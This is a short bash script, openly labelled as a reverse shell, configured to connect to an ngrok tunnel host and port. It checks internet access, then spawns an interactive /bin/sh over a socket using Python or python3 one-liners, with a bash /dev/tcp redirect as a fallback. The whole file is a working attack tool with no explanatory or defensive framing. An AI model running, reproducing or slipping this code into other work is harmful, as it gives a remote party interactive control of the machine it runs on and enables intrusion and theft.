#!/bin/bash

# Configuration for the reverse shell
HOST="0.tcp.ap.ngrok.io"  # Update with your listener's IP address
PORT="18593"  # Update with your listener's port number

# Function to check network connectivity
function check_network {
    # Ping Google DNS to check for active internet connection
    ping -c 1 8.8.8.8 >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        return 0
    else
        echo "Network check failed. Unable to reach the internet."
        return 1
    fi
}

# Function to create a stable reverse shell
function create_shell {
    # Using Python to create a more stable reverse shell
    if command -v python >/dev/null 2>&1; then
        python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('$HOST',$PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(['/bin/sh','-i']);"
    elif command -v python3 >/dev/null 2>&1; then
        python3 -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('$HOST',$PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(['/bin/sh','-i']);"
    else
        # Fallback to using /bin/bash if Python is not available
        /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1
    fi
}

# Main execution logic
if check_network; then
    create_shell
else
    echo "Failed to establish a network connection."
    exit 1
fi

